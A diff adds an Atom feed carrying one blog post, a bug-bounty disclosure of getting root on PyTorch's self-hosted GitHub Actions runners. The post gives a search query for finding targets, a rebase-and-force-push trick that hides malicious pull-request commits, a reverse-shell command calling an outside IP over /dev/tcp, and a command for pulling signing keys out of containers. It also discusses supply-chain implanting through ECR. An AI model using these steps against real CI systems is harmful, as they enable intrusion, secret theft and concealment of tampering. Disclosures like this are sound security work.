@@ -1,0 +1,147 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="https://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: github | Mark Young]]></title>
+  <link href="https://markyoung.us/blog/categories/github/atom.xml" rel="self"/>
+  <link href="https://markyoung.us/"/>
+  <updated>2024-08-22T15:39:28+00:00</updated>
+  <id>https://markyoung.us/</id>
+  <author>
+    <name><![CDATA[Mark Young]]></name>
+    
+  </author>
+  <generator uri="https://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[Zuckerpunch - Abusing self hosted github runners at Facebook]]></title>
+    <link href="https://markyoung.us/post/zuckerpunch"/>
+    <updated>2022-08-25T00:00:00+00:00</updated>
+    <id>https://markyoung.us/post/zuckerpunch</id>
+    <content type="html"><![CDATA[<p>I abused Github Actions to get full root into the PyTorch ci runners. <!-- more --></p>
+
+<p><br/>
+<br/></p>
+
+<h3>Timeline</h3>
+
+<ul>
+<li><code>4/18</code> Initial research/exploit with an automated case response.</li>
+<li><code>4/20</code> First human response to forward to the pytorch team.</li>
+<li><code>4/27</code> I reached out to follow up.</li>
+<li><code>5/11</code> Meta responds that there is no update.</li>
+<li><code>6/9</code> I reach out again to ask about bounty terms and push for a >6 week response.</li>
+<li><code>6/22</code> Meta responds: <code>Unfortunately after discussing this with the product team this isn't an issue we're going to fix or reward, although code execution is possible on these machines its by design and additionally the product team has mentioned that the actions are spun up on short lived nodes (similarly to how github operates their own action runners) which limits the impact further.</code></li>
+<li><code>6/24</code> I respond with multiple follow ups explaining (and again exploiting further) the scope and severity including secrets exfiltration and prove lateral movement abilities. I exploit it further and PyTorch notices and bans my user. I set up a zoom call to talk.</li>
+<li><code>6/27</code> Call goes well, team is respectful and insightful, discuss remediation, things affected and scope.</li>
+<li><code>6/30 - 7/22</code> I use favors to get in contact with the team after another month of no responses.</li>
+<li><code>7/22</code> - Meta responds &lsquo;We&rsquo;re still in discussion with the product team&rsquo; and refuses further discussion about impact and bounty</li>
+<li><code>8/16</code> - Another follow up sent with no responses.</li>
+<li><code>8/19</code> - After more favors I&rsquo;m able to escalate it to a new security engineer at meta that provides an extremely long and helpful response</li>
+<li><code>8/22 - 8/24</code> - Back and forth about scope and impact</li>
+<li><code>8/24</code> Resolved and $10,000 bounty paid out with a 7.5% bonus due to timeline</li>
+</ul>
+
+
+<p><br/>
+<br/></p>
+
+<h3>Extra resources</h3>
+
+<ul>
+<li><a href="https://iterative.ai/blog/testing-external-contributions-using-github-actions-secrets/">iterative blog post referencing this</a></li>
+<li><a href="https://github.blog/changelog/2022-10-12-reverted-recent-change-that-caused-some-pull-requests-to-be-incorrectly-marked-as-merged/">Github&rsquo;s revert</a></li>
+</ul>
+
+
+<p><br/>
+<br/></p>
+
+<h3>The Gritty</h3>
+
+<p>I run a somewhat successful open source <a href="https://github.com/myoung34/docker-github-actions-runner">github action runner project</a></p>
+
+<p>Github provides CI runners but they have some nuances around configuration and ability. You can run your own, however, if you have special needs such as hardware requirements, security policies, etc.</p>
+
+<p>There&rsquo;s a lot of <a href="https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#hardening-for-self-hosted-runners">information</a> around the hardening of these that indicate that <a href="https://docs.github.com/en/actions/hosting-your-own-runners/about-self-hosted-runners#self-hosted-runner-security">running them on public repos is a bad idea</a>.</p>
+
+<p>That said: if you need to you still can but you should be mindful of a few settings.</p>
+
+<p>The most important setting is what I decided to go after.</p>
+
+<p><img src="/images/gha.png"></p>
+
+<p>That first checkbox isn&rsquo;t the default, but if you&rsquo;re not careful it seems safer than it is. What it means is that if you&rsquo;re not a new user, you can submit changes to the CI yaml and itll affect what&rsquo;s run in the PR. So that&rsquo;s what I did.</p>
+
+<p>I spent an hour or so using carefully crafted google search like <code>site:github.com inurl:workflows +"self-hosted"</code> and pulled up around maybe 30  or so candidates.</p>
+
+<p>The issue is that there&rsquo;s no way to know if they have this checkbox until you open a PR and you potentially notify people of what you&rsquo;re doing.</p>
+
+<p>Throughout these pull-requests I was able to further abuse a github UI bug that let&rsquo;s me &ldquo;hide my commit&rdquo; and it appears as though I merged my PR. It&rsquo;s confusing and weird but it removes the ability for them to see what I was doing.</p>
+
+<p><img src="/images/gha1.png"></p>
+
+<p>What I did here was:</p>
+
+<ul>
+<li>Fork the repo.</li>
+<li>Make a change to github actions workflows that appear to have self hosted runners looking for jobs (making sure to keep <code>runs-on: self-hosted</code>) with something like: <code>run: echo "Testing refactor"</code>.</li>
+<li>Push the commit with a boring message like &ldquo;Refactoring&rdquo;.</li>
+<li>Immediately do <code>git rebase -i HEAD^</code>. This is the key part. This basically resets my branch to the default branches SHA. Meaning there&rsquo;s no difference at all in tree history between the default branch (that I targeted for a PR) and the current branch/PR now.</li>
+<li><code>git push origin {branch_name} -f</code></li>
+</ul>
+
+
+<p>The bug above is simply that the github UI now sees no changes to the branch (0 files changed). And since the SHA exists as the HEAD SHA on the default branch: it looks merged. Now there&rsquo;s no way to see what I did. The emails from git only show a link to the PR with some metadata that a file changed, but not what. If someone had an integration it would have had to be able to pull the diff from my SHA to theirs <em>immediately</em>. Because I force pushed it&rsquo;s no longer in existence in my fork so it&rsquo;s gone forever and after a few seconds there&rsquo;s no way to pull what my change showed.</p>
+
+<p>The best part is: it already kicked off a potential github actions run though.</p>
+
+<p>So here one of two things happens:</p>
+
+<ul>
+<li>It runs and you&rsquo;ll know because you&rsquo;d see <code>echo "Testing refactor"</code></li>
+<li>It doesn&rsquo;t run because they had the checkboxes set correctly and you&rsquo;d see this:</li>
+</ul>
+
+
+<p><img src="/images/gha2.png"></p>
+
+<p>Now it&rsquo;s late at night, I&rsquo;ve sumbitted and undone roughly 30 PR&rsquo;s until I get a hit.</p>
+
+<p>PyTorch.</p>
+
+<p>This repo has a <em>ton</em> of yml in all shapes and fashion. And it makes sense to use self-hosted because of all the specialized hardware to run GPU acceleration.</p>
+
+<p>I basically had full reign to any of these now that I can submit any change to CI.</p>
+
+<p>The question is only: is there monitoring in place? Honestly this isn&rsquo;t common because CI is just all over the place. Tests change, infra is all over the place with requirements changing in dependencies, etc.</p>
+
+<p>So I decided to shell in with a reverse shell. A reverse shell means I&rsquo;m going to make it connect to something I have so that I can get into it as opposed to me going into it directly. Same result, but backwards. To do that I spun up a small digital ocean box and set up a reverse shell listener with <code>nc -u -lvp 9001</code></p>
+
+<p>On CI I issued a pull-request with
+<br/>
+<code>run: sh -i 5&lt;&gt; /dev/tcp/143.110.155.178/9001 0&lt;&amp;5 1&gt;&amp;5 2&gt;&amp;5</code></p>
+
+<p>On my digital ocean box: I&rsquo;m now connected to the machine.</p>
+
+<p>From here I noticed 2 things:</p>
+
+<ul>
+<li>Some of these instances are ephemeral AWS instances that have root by default and a file with plaintex IAM user keys for circleci</li>
+<li>Some of these intances were less ephemeral Jenkins instances that didnt run as root but allowed sudo.</li>
+</ul>
+
+
+<p>Basically they wouldn&rsquo;t live forever but I had root on both.</p>
+
+<p>My first attempt was to exfiltrate CI secrets but this didn&rsquo;t quite work because forks cant exfiltrate secrets via the actions yaml (theyre not in the forked repo). I was able to prove, however, that a few things such as Android builders ran via docker and would land on these instances with the secrets nightly + on-demand. I can&rsquo;t force that to happen but I would be able to exfiltrate the signing key once the docker container was running with <code>docker inspect {container id} | jq '.[].Config.Env[0]'</code></p>
+
+<p>Next: AWS abuse. I wasn&rsquo;t able to find out directly but these instances had access to many s3 buckets. They likely had write access to some meaning I could plant files but that&rsquo;s boring. What they did have though was ECR image support. Without ECR Immutable tags on (confirmed) I would be able to rebuild any image for use by downstream internal projects. Meaning that if downstreams werent locking images to their build SHA&rsquo;s (most dont on latest or semver tags in general) I could implant anything into these containers and re-push them so that downstream projects would pull them. The effect of this at this time is unknown as this isnt the pytorch distributable, but the hope would have been that I could supply-chain internally. This scope stays &ldquo;tbd&rdquo;.</p>
+
+<p>It also didn&rsquo;t appear that these run in a VPC meaning that unless security software is installed there&rsquo;s nothing to prevent me from doing boring malicious stuff like mine crypto, blast emails, etc. If it were in a VPC I&rsquo;d still have this possibility but things like GuardDuty (if enabled) would catch me doing things and flag it as irregular activity. Not worth it here and a good way to violate reasonable disclosure.</p>
+
+<p>The IAM access (both from the role attached to the instance) and the IAM user were overprovisioned and also contributed to the bounty. The PyTorch team is futher lowering the permissions here to only necessary as well as (I&rsquo;m assuming) bucket policies to match.</p>
+]]></content>
+  </entry>
+  
+</feed>
